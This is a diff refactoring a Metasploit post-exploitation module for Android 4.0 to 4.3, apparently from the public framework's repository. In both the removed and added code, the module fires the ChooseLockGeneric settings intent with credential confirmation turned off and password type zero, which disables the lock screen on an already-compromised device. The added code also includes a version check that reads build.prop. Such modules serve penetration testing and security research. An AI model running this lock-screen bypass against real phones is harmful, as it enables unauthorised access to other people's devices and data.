@@ -1,14 +1,13 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit4 < Msf::Post
+class MetasploitModule < Msf::Post
   Rank = NormalRanking
 
   include Msf::Post::Common
+  include Msf::Post::Android::System
 
   def initialize(info={})
     super( update_info( info, {
@@ -39,28 +38,36 @@ class Metasploit4 < Msf::Post
     ))
   end
 
-  def run
-    buildprop = cmd_exec('cat /system/build.prop')
+  def is_version_compat?
+    build_prop = get_build_prop
 
-    if buildprop.blank?
-      print_error("Blank build.prop, try again")
-      return
+    # Sometimes cmd_exec fails to cat build_prop, so the #get_build_prop method returns
+    # empty.
+    if build_prop.empty?
+      fail_with(Failure::Unknown, 'Failed to retrieve build.prop, you might need to try again.')
     end
 
-    unless buildprop =~ /ro.build.version.release=4.[0|1|2|3]/
+    android_version = Gem::Version.new(build_prop['ro.build.version.release'])
+    if android_version <= Gem::Version.new('4.3') && android_version >= Gem::Version.new('4.0')
+      return true
+    end
+
+    false
+  end
+
+  def run
+    unless is_version_compat?
       print_error("This module is only compatible with Android versions 4.0 to 4.3")
       return
     end
 
-    output = cmd_exec('am start -n com.android.settings/com.android.settings.ChooseLockGeneric --ez confirm_credentials false --ei lockscreen.password_type 0 --activity-clear-task')
-    if output =~ /Error:/
-      print_error("The Intent could not be started")
-      vprint_status("Command output: #{output}")
-    else
+    result = session.android.activity_start('intent:#Intent;launchFlags=0x8000;component=com.android.settings/.ChooseLockGeneric;i.lockscreen.password_type=0;B.confirm_credentials=false;end')
+    if result.nil?
       print_good("Intent started, the lock screen should now be a dud.")
       print_good("Go ahead and manually swipe or provide any pin/password/pattern to continue.")
+    else
+      print_error("The Intent could not be started: #{result}")
     end
   end
-
 end
 
